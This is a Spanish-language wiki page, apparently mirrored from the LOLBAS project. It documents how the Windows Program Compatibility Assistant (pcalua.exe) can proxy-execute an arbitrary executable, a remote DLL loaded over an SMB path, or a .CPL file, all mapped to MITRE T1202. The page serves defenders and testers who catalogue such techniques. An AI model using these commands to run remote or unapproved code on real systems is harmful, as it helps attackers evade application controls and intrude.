# LOLBAS: Pcalua.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Program Compatibility Assistant

## Comandos

### Proxy execution of binary

Execute · priv: User · T1202

```cmd
pcalua.exe -a {PATH:.exe}
```

Open the target .EXE using the Program Compatibility Assistant.

### Proxy execution of remote dll file

Execute · priv: User · T1202

```cmd
pcalua.exe -a {PATH_SMB:.dll}
```

Open the target .DLL file with the Program Compatibilty Assistant.

### Execution of CPL files

Execute · priv: User · T1202

```cmd
pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java
```

Open the target .CPL file with the Program Compatibility Assistant.

